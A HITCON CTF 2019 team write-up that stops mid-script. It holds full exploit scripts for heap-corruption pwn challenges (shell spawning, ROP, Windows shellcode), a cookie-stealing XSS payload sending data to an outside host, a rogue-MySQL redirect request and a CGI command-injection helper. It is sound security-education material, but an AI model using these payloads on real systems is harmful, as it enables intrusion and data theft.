# HITCON CTF 5th 2019 Writeup (A\*0\*E)

## Pwn

### PoE I luna 

An editor run in QEMU VM, no PIE. The bug is inconsistency of clipboard cache caused by `cut` and `paste`. For example, 

```python
insert(0, 'q'*0xff)
newtab() # 1 
insert(0, 'qweqwe') 
cut(0, 6)
to(0) # 0 
cut(0, 128)
newtab() # 2 
insert(0, 'a'*160)
to(1)  # 1 
paste(0) # vul
show(0, 0x38)
```

Before `paste(0)`, the clipboard `cachebuf` is tab1's `cachebuf`, but `size` is tab0's `size` . After `paste(0)`, tab1 gets back the original `cachebuf`, but now `size` becomes 128, which is larger than `len('qweqwe')`. With `replace` feature, we can do overflow to corrupt tab2's `cachebuf`, then boom.

Exploit is [here](https://gist.github.com/elnx/fd7f579ac828e5f3eae183cb5473b1ec).

### trick or treat

- malloc a big chunk to leak libc
- write stdin `_IO_base_buffer` then the input buffer will be the libc's bss.  
- overwrite libc's bss, change the CTYPE table then scanf will consider any char as number.  
- write system pointer to realloc hook and send /bin/sh

```python
from pwn import *
context.log_level="debug"
context.arch="amd64"
pwn_file="./trick_or_treat"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
r=remote("3.112.41.140",56746)

def getoff(off):
    return hex((off/8)&0xffffffffffffffff)

size = 0x10000000
r.sendlineafter('Size:', str(size))
r.recvuntil('Magic:')
leak = r.recvline()
buf = int(leak,16)
libc.address = buf-0x10+size+0x1000
print hex(libc.address)
off = getoff(libc.address+0x3eba40-buf)
val =  hex(libc.address+0x3eba40+0x2000)
r.sendlineafter('Value:', off + ' '+ val)

f = {
    0:libc.address+0x3ed8c0,
    0x1a8:p64(libc.address+0x117cdc),# malloc hook
    0x1a0:p64(libc.sym["system"]),
    0xb40:p64(libc.address+0x3ec638),
    0xbb0:p16(0xd808)*0x100
}
r.recvuntil("Value:")
r.send("sh;\x00\x00"+fit(f,filler="\x00"))
r.sendline("echo 123\n\n\n")
r.sendline("echo 123\n\n\n")
r.recvuntil("123");
r.interactive()
```


> If only setting `__free_hook` to `system`, because `scanf("%lx")` only takes `[0-9a-f]` byte, we cannot do `system("sh")`.

> However , we can solve this challenge in a *misc* way: execute `ed`, then `!/bin/sh`.


### EmojiVM

The emojivm interpreter is also pwnable. The vulnerability is that, although the `pop` command will check the `sp`, other commands like `add` never check the underflow of stack. And the array of global buffers is just above the stack so that we can add the pointer with certain offset. 

With heap manipulation, we can place the structure of buffer B into content of buffer A, so that edit buffer A will change the pointer inside buffer B and achieve arbitrary read/write.

The program generating script and exploit is below.

```python
dd = {'and': 7, 'show': 20, 'jnz': 11, 'pop': 14, 'lessthan': 8, 'push_g': 15, 'xor': 6, 'add': 2, 'exit': 23, 'new': 17, 'jmp': 10, 'jz': 12, 'pop_g': 16, 'nop': 1, 'mult': 4, 'mod': 5, 'edit': 19, 'wcout': 22, 'push': 13, 'cmp': 9, 'show_stack': 21, 'minus': 3, 'delete': 18}

cmds = {1: '\xf0\x9f\x88\xb3', 2: '\xe2\x9e\x95', 3: '\xe2\x9e\x96', 4: '\xe2\x9d\x8c', 5: '\xe2\x9d\x93', 6: '\xe2\x9d\x8e', 7: '\xf0\x9f\x91\xab', 8: '\xf0\x9f\x92\x80', 9: '\xf0\x9f\x92\xaf', 10: '\xf0\x9f\x9a\x80', 11: '\xf0\x9f\x88\xb6', 12: '\xf0\x9f\x88\x9a', 13: '\xe2\x8f\xac', 14: '\xf0\x9f\x94\x9d', 15: '\xf0\x9f\x93\xa4', 16: '\xf0\x9f\x93\xa5', 17: '\xf0\x9f\x86\x95', 18: '\xf0\x9f\x86\x93', 19: '\xf0\x9f\x93\x84', 20: '\xf0\x9f\x93\x9d', 21: '\xf0\x9f\x94\xa1', 22: '\xf0\x9f\x94\xa2', 23: '\xf0\x9f\x9b\x91'}
nums = {0: '\xf0\x9f\x98\x80', 1: '\xf0\x9f\x98\x81', 2: '\xf0\x9f\x98\x82', 3: '\xf0\x9f\xa4\xa3', 4: '\xf0\x9f\x98\x9c', 5: '\xf0\x9f\x98\x84', 6: '\xf0\x9f\x98\x85', 7: '\xf0\x9f\x98\x86', 8: '\xf0\x9f\x98\x89', 9: '\xf0\x9f\x98\x8a', 10: '\xf0\x9f\x98\x8d'}

prog = ''
for i in range(10):
    if i==0:
        prog += cmds[dd['push']]
        prog += nums[8]
    elif i==7:
        prog += cmds[dd['push']]
        prog += nums[2]
        prog += cmds[dd['push']]
        prog += nums[8]
        prog += cmds[dd['mult']]
    else:
        prog += cmds[dd['push']]
        prog += nums[1]
    prog += cmds[dd['new']]

prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['edit']]

prog += cmds[dd['add']]
prog += cmds[dd['add']]
prog += cmds[dd['push']]
prog += nums[4]
prog += cmds[dd['push']]
prog += nums[8]
prog += cmds[dd['mult']]

prog += cmds[dd['add']]
prog += cmds[dd['push']]
prog += nums[9]
prog += cmds[dd['show']]

prog += cmds[dd['pop']]

prog += cmds[dd['push']]
prog += nums[4]
prog += cmds[dd['push']]
prog += nums[8]
prog += cmds[dd['mult']]
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['minus']]
prog += cmds[dd['add']]

prog += cmds[dd['push']]
prog += nums[7]
prog += cmds[dd['edit']]

prog += cmds[dd['push']]
prog += nums[8]
prog += cmds[dd['show']]

prog += cmds[dd['push']]
prog += nums[7]
prog += cmds[dd['edit']]

prog += cmds[dd['push']]
prog += nums[8]
prog += cmds[dd['edit']]

prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['delete']]

prog += cmds[dd['exit']]

f = open('prog','wb')
f.write(prog)
f.close()

```

```python
from pwn import *

context.log_level='debug'

#c = process(['./emojivm','prog'])
#pause()
c = remote('3.115.176.164', 30262)
c.recvuntil('\nhashcash ')
args = c.recvline().strip()

print args.split(' ')
pause()
hh = process(['hashcash']+args.split(' '))
hh.recvuntil('token: ')
token = hh.recvline()

c.sendafter('token:', token)

with open('prog') as f:
    code = f.read()

c.sendlineafter('size: ( MAX: 1000 bytes )', str(len(code)))
c.sendafter('file:',code)

c.send('/bin/sh\x00')

leak = c.recvrepeat(timeout=2)
leak = leak.strip().ljust(8,'\x00')
heap = u64(leak)
print hex(heap)

heap -= 0x3600
print hex(heap)

#pause()

p = p64(0x1000)+p64(heap+0x68)
c.send(p)

#leak = c.recv(6)
leak = c.recvrepeat(timeout=2)
leak = leak.strip().ljust(8,'\x00')
libc = u64(leak)-0x3ebca0
print hex(libc)

#p = p64(0x8)+p64(libc+0x3ebc30)
p = p64(0x8)+p64(libc+0x3ed8e8)
c.send(p)

p = p64(libc+0x4f322)
c.send(p)

c.interactive()
```

### Crypto in the Shell

This binary allow us to encrypt any memory with AES-CBC and will output the result of encryption. 
The key is unknown but we can encrypt the key at first, so we  acquire the key used in later encryptions. After that we can encrypt part of data segment to leak the address of binary base and libc.
We cannot control the value written into memory. But since CBC mode use IV, we can always utilize some encrypting operation near the IV memory to randomize the IV, and have a 1/256 chance to get our desired last byte of IV to control one byte of our encryption result.
Since we can only encrypting 32 times in total, only around 10  controlled bytes can be written into. The `scanf` will trigger realloc/free but only `0-9a-f` can be placed inside the `rdi` buffer and one gadgets do not work here. Finally we rewrite the realloc hook into `gets` (3 bytes) and free hook to `system` (6 bytes). The former one allow us to input `/bin/sh;` inside buffer while latter one trigger the shell.

```python
from pwn import *
from Crypto.Cipher import AES

context.log_level='debug'

def getoff(off):
    return str(off&0xffffffffffffffff)

'''
c = process('./chall')
pause()
key = 'd3b136da186e19e4a5db83d813c53207'.decode('hex')
'''
c = remote('3.113.219.89', 31337)

c.sendlineafter('offset:',getoff(-0x20))
c.sendlineafter('size:','15')
key = c.recv(16,timeout=1)


c.sendlineafter('offset:',getoff(0x202000-0x2023a0))
c.sendlineafter('size:','15')
ct0 = c.recv(16,timeout=1)
a = AES.new(key=key, IV='\x00'*16, mode=AES.MODE_CBC)
pt = a.decrypt(ct0)
pie = u64(pt[8:])-0x202008


c.sendlineafter('offset:',getoff(0x202360-0x2023a0))
c.sendlineafter('size:','15')
ct0 = c.recv(16,timeout=1)

a = AES.new(key=key, IV='\x00'*16, mode=AES.MODE_CBC)
pt = a.decrypt(ct0)
libc = u64(pt[:8]) - 0x3ec680
print hex(pie)
print hex(libc)
#pause()

reallochook = libc+0x3ebc28
system = libc+0x4f440
gets = libc+0x800b0
tar = p64(gets)
dat = p64(0)+p64(libc+0x97410)+p64(libc+0x98790)
dat = map(ord, dat)
buf = [0]*48

def dosearch(cnt, curb, curd, tt, maxh):
    if cnt>=maxh:
        a = AES.new(key=key, IV=''.join(map(chr, curb[:16])), mode=AES.MODE_CBC)
        ct = a.encrypt(curd)
        if ct[-1] == tt:
            return [-1]
        else:
            return []
    for p0 in xrange(0x20):
        a = AES.new(key=key, IV=''.join(map(chr, curb[:16])), mode=AES.MODE_CBC)
        ct = a.encrypt(''.join(map(chr, curb[p0:p0+0x10])))
        nextb = curb[:]
        nextb[p0:p0+0x10] = map(ord, ct)
        res = dosearch(cnt+1, nextb, curd, tt, maxh)
        if len(res)>0:
            return [p0]+res
    return []

for i in range(3):
    curd = ''.join(map(chr,dat[3-i:16+3-i]))
    curb = buf[:]
    res = dosearch(0, curb, curd, tar[2-i], 2)
    if len(res)==0:
        res = dosearch(0, curb, curd, tar[2-i], 3)
    print res
    assert len(res)>0
    for pos in res:
        if pos==-1:
            break
        c.sendlineafter('offset:',getoff(pos-0x10))
        c.sendlineafter('size:','15')
        a = AES.new(key=key, IV=''.join(map(chr, buf[:16])), mode=AES.MODE_CBC)
        ct = a.encrypt(''.join(map(chr, buf[pos:pos+0x10])))
        buf[pos:pos+0x10] = map(ord,ct)
        ct0 = c.recv(16,timeout=1)
        assert ct == ct0

    c.sendlineafter('offset:',getoff(reallochook-(pie+0x2023a0)-0x10+3-i))
    c.sendlineafter('size:','15')
    a = AES.new(key=key, IV=''.join(map(chr, buf[:16])), mode=AES.MODE_CBC)
    ct = a.encrypt(curd)
    dat[3-i:16+3-i] = map(ord,ct)
    ct0 = c.recv(16,timeout=1)
    assert ct == ct0
    print hex(ord(tar[2-i]))
    print 'true'
    #pause()
        
freehook = libc+0x3ed8e8
tar = p64(system)
dat = p64(libc+0x5e94c0)+p64(0)+p64(0)
dat = map(ord, dat)

for i in range(6):
    curd = ''.join(map(chr,dat[6-i:16+6-i]))
    curb = buf[:]
    res = dosearch(0, curb, curd, tar[5-i], 2)
    if len(res)==0:
        res = dosearch(0, curb, curd, tar[5-i], 3)
    print res
    assert len(res)>0
    for pos in res:
        if pos==-1:
            break
        c.sendlineafter('offset:',getoff(pos-0x10))
        c.sendlineafter('size:','15')
        a = AES.new(key=key, IV=''.join(map(chr, buf[:16])), mode=AES.MODE_CBC)
        ct = a.encrypt(''.join(map(chr, buf[pos:pos+0x10])))
        buf[pos:pos+0x10] = map(ord,ct)
        ct0 = c.recv(16,timeout=1)
        assert ct == ct0

    #print ''.join(map(chr,dat)).encode('hex')
    #pause()
    c.sendlineafter('offset:',getoff(freehook-(pie+0x2023a0)-0x10+6-i))
    c.sendlineafter('size:','15')
    a = AES.new(key=key, IV=''.join(map(chr, buf[:16])), mode=AES.MODE_CBC)
    ct = a.encrypt(curd)
    dat[6-i:16+6-i] = map(ord,ct)
    ct0 = c.recv(16,timeout=1)
    print hex(ord(tar[5-i]))
    assert ct == ct0
    print 'true'
    #pause()
    # ???
    dat[:8] = map(ord, p64(0))

#print 'go?'
#pause()
#c.sendlineafter('offset:','0'.ljust(0x800,'0')+';/bin/sh;')
c.sendafter('offset:','0'.ljust(0x800,'0'))
c.sendline('/bin/sh;')
c.sendline('')
#c.sendlineafter('size:','15')
#ct0 = c.recv(16,timeout=1)

c.interactive()
```

### LazyHouse

This challenge allow us `calloc` chunks in any size > 0x7f, and `malloc` only one 0x217 chunk if we have enough money. In `buy` function, size can be a negative number, which can make us very rich, and in `update` function, we can overflow 32bytes beyong one chunk only once. After we get enough money, we use the overflow bug to modify a inused chunk size to overlap next two large chunk, sell the two overlaped chunk and show the victim chunk we can get libc address and heap address. And then, re-buy them and free in a good order to do large bin attack. We use large bin attack overwrite tcache address stored in libc to a large bin address. We fake a tcache which has only one 0x217 free chunk to `__malloc_hook` and malloc it to modify `__malloc_hook` to a `leave;ret;` gadget. Because `malloc` function has a `mov rbp, rdi` in very begin before call `__malloc_hook`, we can do a stack migration to our control heap. Because of seccomp, we get flag by a open/read/write ROP.

```python
#!/usr/bin/env python
# encoding: utf-8

import time, string, pdb, sys
from random import randint
from pwn import remote, process, ELF
from pwn import context
from pwn import p32, p64, u32, u64, asm
from pwn import cyclic, flat

DEBUG = False
if len(sys.argv) == 1:
    DEBUG = True
binaryPath = "./lazyhouse"
libcPath = "libc.so.6"
r = None
host = "3.115.121.123"

context(arch='amd64', os='linux', log_level='info')

def buyerr(idx,size):
    r.recvuntil('choice')
    r.sendline('1')
    r.recvuntil('Index')
    r.sendline(str(idx))
    r.recvuntil('Size')
    r.sendline(str(size))


def buy(idx,size,mess):
    r.recvuntil('choice')
    r.sendline('1')
    r.recvuntil('Index')
    r.sendline(str(idx))
    r.recvuntil('Size')
    r.sendline(str(size))
    r.recvuntil('House')
    r.send(mess)

def sell(idx):
    r.recvuntil('choice')
    r.sendline('3')
    r.recvuntil('Index')
    r.sendline(str(idx))

def edit(idx,mess):
    r.recvuntil('choice')
    r.sendline('4')
    r.recvuntil('Index')
    r.sendline(str(idx))
    r.recvuntil('House')
    r.send(mess)

def show(idx):
    r.recvuntil('choice')
    r.sendline('2')
    r.recvuntil('Index')
    r.sendline(str(idx))

def exploit(host):
    global r
    port = 5731
    flag = ""

    if DEBUG:
        if libcPath == "":
            r = process(binaryPath)
        else:
            r = process(binaryPath, env={'LD_PRELOAD':libcPath})
        raw_input("attach")
    else:
        # A.local = False      # local debug return real 'A'
        r = remote(host, port)
    if binaryPath != "":
        binary = ELF(binaryPath)
    if libcPath != "":
        libc = ELF(libcPath)

    buyerr(0, 0x10000000000000100/218)
    sell(0)

    buy(7, 0x410, "xxx")
    buy(0, 0x80, "aaa")
    buy(1, 0x800, "bbb")
    buy(2, 0x80, "aaa")
    buy(3, 0x500, "bbb")
    buy(4, 0x80, "aaa")
    buy(5, 0x510, 0x500*'a'+p64(0x1350)+p64(0xa1))
    buy(6, 0x80, "xxx")
    edit(0, "\x00"*0x80+p64(0)+p64(0x1351)+'\n')
    sell(1)
    buy(1, 0x1340, 'z'*0x800+p64(0)+p64(0x91)+'x'*0x80+p64(0)+p64(0x511)+'x'*0x500+p64(0)+p64(0x91)+'x'*0x80+p64(0)+p64(0x521)+'x'*0x510)
    sell(3)
    sell(5)
    show(1)
    r.recvuntil('x'*0x80)
    r.recv(0x10)
    libc.address = u64(r.recv(8)) - 0x1e4ca0
    print "libc.address:", hex(libc.address)
    heap_leak = u64(r.recv(8))
    print "heap_leak:", hex(heap_leak)
    heap_base = heap_leak-0x1120-0x420
    print "heap_base:", hex(heap_base)
    buy(3, 0x500, "ccc")
    buy(5, 0x510, 0x500*'c'+p64(0x1350)+p64(0xa1))
    sell(3)
    sell(1)
    sell(5)
    sell(7)
    # target_addr = libc.address + 0x1e7600 - 0x10 # global_max_fast
    # target_addr = libc.symbols["_IO_list_all"] - 0x10 # _IO_list_all
    target_addr = libc.address + 0x1ec4b0 - 0x10 # tcache
    # target_addr = 0xdeadbeef

    payload = "z"*0x800+p64(0)+p64(0x91)+'x'*0x80
    payload += p64(0)+p64(0x511)+p64(libc.address+0x1e50d0)+p64(target_addr)+p64(heap_base+0xb80+0x420)*2+'x'*0x4e0
    payload += p64(0)+p64(0x90)+'x'*0x80
    payload += p64(0)+p64(0x521)+p64(libc.address+0x1e4ca0)+p64(heap_base+0x250)
    payload = payload.ljust(0x1340,"x")

    buy(1, 0x1340, payload)
    buy(7, 0x410, "xxx")
    sell(1)

    target = libc.symbols["__malloc_hook"]
    # target = libc.symbols["__free_hook"]
    fake_tcache = p64(0)*4+p64(1)+p64(0)*35+p64(target)+p64(0)*31
    
    xchgeaxedi = 0x145585 + libc.address
    poprdxrsi = 0x12bdc9 + libc.address
    poprsi = 0x26f9e + libc.address
    poprdi = 0x26542 + libc.address
    syscall = 0xcf6c5 + libc.address
    poprax = 0x47cf8 + libc.address
    new_stack = heap_base + 0x19b0-0x230+0x50+0x100
    flag_str = heap_base + 0x19b0-0x230+1
    flag_buf = heap_base + 0x19b0
    setcontext_addr = heap_base + 0x19b0-0x230+0x50
    payload = "z"*0x800+p64(0)+p64(0x91)+'x'*0x80
    payload += p64(0)+p64(0x511)+p64(libc.address+0x1e50d0)+p64(target_addr)+p64(heap_base+0xb80+0x420)*2+'x'*0x4e0
    payload += p64(0)+p64(0x90)+'x'*0x80
    flag_name = "\x00/home/lazyhouse/flag\x00".ljust(0x30,"\x00")
    payload += fake_tcache+flag_name+"f"*0x20+(0xa0 * '\x00' + p64(new_stack) + p64(poprdi+1)).ljust(0x100, "\x00")


    rop_chain = [
        0,
        poprsi,
        0,
        poprdi,
        flag_str,
        poprax,
        2,
        syscall,  # open

        xchgeaxedi,
        poprdxrsi,
        0x60,
        flag_buf,
        poprax,
        0,
        syscall,  # read

        poprdi,
        1,
        poprdxrsi,
        0x60,
        flag_buf,
        poprax,
        1,
        syscall,  # write
    ]

    payload += flat(rop_chain)

    payload = payload.ljust(0x1340,"x")
    buy(1, 0x1340, payload)

    setcontext = 0x55e35 + libc.address
    leave_ret = 0x58373 + libc.address
    r.recvuntil('choice') # buy super
    r.sendline('5')
    r.sendlineafter("House:", p64(leave_ret))

    buy(5, new_stack, "China No.1")

    return flag

if __name__ == '__main__':
    print exploit(host)
    r.interactive()
```

### dadabb

When updating the value of the key, it's based on the original length, so there is heap overflow here. First we can leak data by overwriting the buffer pointer of the value. Then we can fake the heap chunk in front of the `FILE` structure pointer, and finally write arbitrary address by overwriting this pointer to our fake `FILE` structure.

```python
from pwn import *

io = remote('13.230.51.176', 4869)

def login(username, password):
    io.recvuntil('>> ')
    io.sendline('1')
    io.recvuntil('User:')
    io.sendline(username)
    io.recvuntil('Password:')
    io.sendline(password)

def update(key, size, value):
    io.recvuntil('>> ')
    io.sendline('1')
    io.recvuntil('Key:')
    io.sendline(key)
    io.recvuntil('Size:')
    io.sendline(str(size))
    io.recvuntil('Data:')
    io.send(value)

def show(key):
    io.recvuntil('>> ')
    io.sendline('2')
    io.recvuntil('Key:')
    io.sendline(key)

def delete(key):
    io.recvuntil('>> ')
    io.sendline('3')
    io.recvuntil('Key:')
    io.sendline(key)

def leak(addr):
    update('1', 0x10, 'A' * 0x18 + p64(header) + p64(addr))
    show('2')
    io.recvuntil('Data:')
    return u64(io.recvn(8))

def logout():
    io.recvuntil('>> ')
    io.sendline('4')

login('orange', 'godlike')
update('1', 0x200, '11')
update('1', 0x10, '11')
update('2', 0x10, '22')
show('1')
io.recvuntil('Data:')
io.recvn(0x18)
header = u64(io.recvn(8))
cookie = (header & 0xffffffffffff) ^ 0x306010007
heap = u64(io.recvn(8)) & (~0xffff)
print hex(header)
print hex(heap)
print hex(cookie)

ntdll = leak(heap+0x2c0)-0x163d10
print hex(ntdll)
Pebldr = ntdll+0x1653A0
print hex(Pebldr)
readmem = leak
imoml = readmem(Pebldr+0x20)
print hex(imoml)
bin_base = readmem(imoml+0x28) - 0x1b80 - 0x70 - 0x2c0
print "bin_base:",hex(bin_base)
iat = bin_base + 0x3000
kernel32 = readmem(iat) - 0x22680
print "kernel32:",hex(kernel32)
peb = readmem(ntdll+0x165308) - 0x80
print "peb:",hex(peb)
teb = peb + 0x1000
print "teb:",hex(teb)
stack = readmem(teb+0x10+1) << 8
print "stack:",hex(stack)
start = stack+0x2ff0
main_ret = bin_base + 0x1E38
virutalprotect = kernel32 + 0x1B680
ret_addr = 0
pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8FB30

exe_addr = heap
shellcode_addr = heap+0xd90+0x70

rop_chain = [pop_rdx_rcx_r8_r9_r10_r11,0x1000,exe_addr,0x40,heap+0x1100,0,0,virutalprotect,shellcode_addr]
rop = ""
for gadget in rop_chain:
    rop += p64(gadget)

for i in range(80, 0x2000/8):
    try :
        val = readmem(start-i*8)
        print "search : %d 0x%x" % (i, val)
        if val == main_ret:
            print "found !"
            ret_addr = start - i*8
            break
    except :
        continue

stack_ret = ret_addr - 0x280

update('3', 0x200, '33')
update('3', 0x10, '33')
update('\x10', 0x10, '44')

update('3', 0x10, 'A' * 0x18 + p64(header) + p64(heap+0xa80) + p64(0x10) + p64(0x10) + p64(0) * 8 + p64(bin_base + 0x5668))
delete('\x10')
update('\x01', 0x200, '55')
update('\x00', 0x10, '66')

logout()
login('orange\x00\x00' + p64(cookie ^ 0x0000000309000009) + p64(heap+0xf60) + p64(heap+0xdb0)[:6], 'godlike')

update('7', 0x300, '77')
update('7', 0x10, '77')
update('8', 0x10, '88')

update('9', 0x100, '99')
update('9', 0x10, '99')
update('B', 0x10, 'BBBB')
delete('8')

update('7', 0x10, 'A' * 0x18 + p64(0x0000000309000009 ^ cookie) + p64(bin_base + 0x5630))
update('9', 0x10, 'A' * 0x18 + p64(0x1000000306010007 ^ cookie) + p64(heap+0xf40) + p64(0x10) + p64(0x3130) + '\x00' * 0x40 + p64(heap+0x860) + p64(0) + p64(0x1000000603010002 ^ cookie) + 'A' * 0x18 + p64(0x0000000306000107 ^ cookie) + p64(heap+0x150) + p64(bin_base + 0x5630))

update('A', 0x80, 'A' * 0x10 + p64(heap) + 'A' * 0x20 + p64(heap+0xd90))

fopen_s = bin_base + 0x31A8
filename = heap + 0xd90 + 0x50
file_handle = heap + 0x1200
mode_r = bin_base + 0x3314
flag = heap + 0x1280
write = bin_base + 0x31B8

fread = bin_base + 0x3208
sc = "\x90" * 0x20 + asm("""
    fopen_s :
        mov rdi,0x%x
        mov rdi,[rdi]
        mov rcx,0x%x
        mov rdx,0x%x
        mov r8, 0x%x
        call rdi
    fread:
        mov rdi,0x%x
        mov rdi,[rdi]
        mov rcx,0x%x
        mov edx,0x100
        mov r8d,1
        mov r9, 0x%x
        mov r9, [r9]
        call rdi
    write:
        mov rdi,0x%x
        mov rdi,[rdi]
        mov rcx,1
        mov rdx,0x%x
        mov r8,0x60
        call rdi
    """ % (fopen_s,file_handle,filename,mode_r,
           fread,flag,file_handle,
           write,flag), arch="amd64")
sc += "\xeb\xfe"

context.log_level = 'debug'
cnt = 0
flag = 0x2049
fd = 0
pad = 0
bufsize = 0x800
ptr = stack_ret
base = ptr
obj = p64(ptr) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(pad) + p64(bufsize) + p64(0)
obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2
filename = 'C:\\dadadb\\flag.txt'.ljust(0x20, '\x00')
payload = obj + filename + sc
update('7', 0x10, payload)
logout()
login('xxx', 'xxx')
payload = rop.ljust(0x100, '\x00')
io.send(payload)

io.interactive()
```

## Web

### Luatic

1. Bypass check with ``_POST[MY_SET_COMMAND]``
2. overwrite ``math.random`` by ``function math.random(a) return 1 end``
3. ``next(math,next(math))`` to get ``math.random`` without ``.``
4. get flag

### Bounty Pl33z

1. In ECMAScript \u2028 and \u2029 could be used as same as CRLF
2. In ECMAScript the extended comment grammar is supported by chrome: 
```
<!---
-->
```
and after the `-->` could append any character allowed in comment
3. Combined the two tricks we could get the final payload:

```
http://3.114.5.202/fd.php?q=758afc7c。n0p。co?cookie="%2Beval(atob(ZG9jdW1lbnQuY29va2ll))%E2%80%a8–%3E
```

### GoGo PowerSQL

1. OOB Write in HTTP Query Params loading.
2. We could overwrite the dbhost with the alpha-only hostname.
3. The Goahead webserver used to have a bug that could overwrite any environment variable. In this problem, the patch has been reverted. And we could overwrite the LOCALDOMAIN with our evil hostname, to bypass the restrict of the hostname.
4. Final payload:

```
GET /cgi-bin/query?LOCALDOMAIN=758afc7c.s.n0p.co&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&name=test&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&xxx=aaa&mmm=user&pass=db HTTP/1.1
Host: 13.231.38.172
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Accept: */*
LOCALDOMAIN: 35.227.42.203
Referer: http://13.231.38.172/index.html
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close


```


The evil mysql server:

https://github.com/allyshka/Rogue-MySql-Server


### Virtual Public Network
Read [orange BH2019 talk](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf). From the `diag.cgi`, we know that it has provided an argument `tpl` for including our perl output into response.

```python

import requests
import urllib2


def run(cmd):
    options = "-r '$x=\"%s\",system$x#' 2>./tmp/m3m3da.thtml <" % cmd
    gogo = urllib2.quote(options)
    url = "http://13.231.137.9/cgi-bin/diag.cgi?tpl=m3m3da&options=" + gogo

    print url
    r = requests.get(url)

    print r
    print '-' * 100
    print cmd
    print
    print r.text

run("/*READ_FLAG*")
```


## Reverse

### emojiVM

patch the binary to output the variable that record the number of steps then brute force to find the key

```python
from pwn import *
import sys
res = b'xxxx-xxxx-xxxx-xxxx-xxxx'
s = ""
flag = 0
maxx = 0
for scsa in range(25):
	for i in range(30,128):	
		#s = res
		p=process(['./emojivm','./chal.evm'])
		p.recvuntil('Please input the secret: ')
		s = res[:flag]
		s += chr(i)
		s += res[flag+1:]
		print s
		p.send(s)
		x = p.recvuntil('\n')
		if x =='\xf0\x9f\x98\xad\n':
			num = (p.recvuntil('\n')[:-1])
			#print num
			xx = u64(num.ljust(8,'\x00'))
			#print xx
			if xx>maxx:
				maxx = xx
				res = s
		else:
			print s
			raw_input("Done")
			print p.recv()#plis-g1v3-me33-th3e-f14g
			sys.exit()#hitcon{R3vers3_Da_3moj1}
		p.close()
		print res
		
	flag+=1

print "key:"+res
```

### Core Dumb

We have the core file of `flag_checker` and I find a core2elf64 tool <https://github.com/enbarberis/core2ELF64>, which worked perfectly for this challenge.

Some reversing work shows this binary decrypt part of memory by xoring with 4-byte constant. And from this memory are 5 functions checking one fragment of flag. Each function is traditional RE (TEA, RC4, CRC, blah) and you can refer to the script below for recovering the flag.

```python
from struct import pack,unpack
import string

f4 = ''
tar = 697893161
num = 0xEDB88320
tar = map(int, bin(tar)[2:].rjust(32,'0'))
num = map(int, bin(num)[2:].rjust(32,'0'))
'''
equs = []
for i in range(32):
    tmp = [0]*32
    tmp[i] = 1
    equs.append(tmp)
equc = [1]*32
for i in range(32):
    lsb = equs[-1][:]
    for i in range(32)[:0:-1]:
        equs[i] = equs[i-1]
    equs[0] = [0]*32
    for j in range(32):
        if lsb[j]==1:
            for k in range(32):
                equs[k][j] ^= num[k]
    lsbc = equc[-1]
    equc = [0] + equc[:-1]
    if lsbc:
        for k in range(32):
            equc[k] ^= num[k]

print equs
print map(lambda (x,y):x^y,zip(tar,equc))
exit()
'''

# solve_left in sage
ans = [0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1]
f4 = hex(int(''.join(map(str,ans)),2))[2:].strip('L').decode('hex')
f4 = f4[::-1]

def crc(s):
    res = 0xffffffff
    res = 0
    for ch in s:
        res ^= ord(ch)
        for i in range(8):
            lsb = res&1
            res = res>>1
            if lsb:
                res ^= 0xEDB88320
    return res

print f4

f0 = ''
tar = pack('Q',0x413317635722649) + 'N^'
key = 'DuMb'
for i in range(10):
    f0 += chr(ord(tar[i])^(ord(key[i%4])-7))
print f0

f1 = [0]*8
tar = [2513145277, 260361337, 3097077878, 173910869, 2592816058, 1890728103, 1924480241, 3564896777]
ptab = map(ord, string.printable)
for i in range(4):
    found = False
